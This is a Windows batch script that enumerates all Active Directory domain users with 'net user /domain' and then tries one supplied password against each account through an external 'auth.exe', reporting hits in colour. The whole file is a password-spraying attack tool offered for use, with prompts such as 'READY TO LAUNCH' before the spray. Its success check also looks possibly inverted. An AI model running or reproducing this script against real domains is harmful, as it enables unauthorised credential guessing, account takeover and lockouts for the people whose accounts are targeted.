@echo off
setlocal enabledelayedexpansion

:: ----------------------------
:: Parse command-line arguments
:: ----------------------------
set "DOMAIN="
set "PASSWORD="

for %%A in (%*) do (
    echo %%A | findstr /I /B /C:"/d:" >nul && set "DOMAIN=%%A"
    echo %%A | findstr /I /B /C:"/p:" >nul && set "PASSWORD=%%A"
)

:: Strip prefixes
if defined DOMAIN set "DOMAIN=%DOMAIN:/d:=%"
if defined PASSWORD set "PASSWORD=%PASSWORD:/p:=%"

:: Validate input
if "%DOMAIN%"=="" (
    goto :usage
)
if "%PASSWORD%"=="" (
    goto :usage
)

:: Enable ANSI color support (for modern consoles)
reg query HKCU\Console 2>nul | find "VirtualTerminalLevel" >nul
if errorlevel 1 (
    reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul
)

:: ----------------------------
:: Step 1: List all domain users
:: ----------------------------
echo.
echo === Gathering domain "%DOMAIN%" information... ===
echo.
nltest /dsgetdc:%DOMAIN%

echo.
call :printyellow "MESSAGE : READY TO DUMP DOMAIN "%DOMAIN%" USER LIST"
pause

echo.
echo === Step 1: Listing users from domain "%DOMAIN%" ===
echo.

:: Temporary list stored in memory
setlocal DisableDelayedExpansion
set "USERS="
setlocal enabledelayedexpansion

set "USER_INDEX=0"

for /f "tokens=1" %%f in ('net user /domain') do (
    set /a USER_INDEX+=1
    if !USER_INDEX! geq 4 (
        if /I not "%%f"=="The" if /I not "%%f"=="command" if /I not "%%f"=="completed" (
            echo %%f
            set "USERS=!USERS! %%f"
        )
    )
)

set /a USER_INDEX=0
for /f "tokens=2" %%f in ('net user /domain') do (
    set /a USER_INDEX+=1
    if !USER_INDEX! geq 3 (
        if /I not "%%f"=="The" if /I not "%%f"=="command" if /I not "%%f"=="completed" (
            echo %%f
            set "USERS=!USERS! %%f"
        )
    )
)

set /a USER_INDEX=0
for /f "tokens=3" %%f in ('net user /domain') do (
    set /a USER_INDEX+=1
    if !USER_INDEX! geq 3 (
        if /I not "%%f"=="The" if /I not "%%f"=="command" if /I not "%%f"=="completed" (
            echo %%f
            set "USERS=!USERS! %%f"
        )
    )
)

echo.
call :printyellow "MESSAGE : READY TO LAUNCH"
pause

:: ----------------------------
:: Step 2: Check password for each user
:: ----------------------------
echo.
echo === Step 2: Checking password "%PASSWORD%" for all users in domain "%DOMAIN%" ===
echo.

for %%U in (!USERS!) do (
    <nul set /p="Trying password for user: %%U... "
    auth.exe /d:%DOMAIN% /u:%%U /p:%PASSWORD% >nul 2>&1
    if errorlevel 1 (
        call :printgreen success!
    ) else (
        call :printred failed
    )
)

echo.
echo Done.
endlocal
goto :eof

:: ----------------------------
:: Color helpers
:: ----------------------------
:printgreen
echo [[32m%~1[0m]
goto :eof

:printred
echo [[31m%~1[0m]
goto :eof

:printyellow
echo [[33m%~1[0m]
goto :eof

:: ----------------------------
:: Usage
:: ----------------------------
:usage
echo Usage: %~nx0 /d:DOMAIN /p:PASSWORD
echo Example:
echo   %~nx0 /d:ACME /p:P@assw0rd
exit /b 1
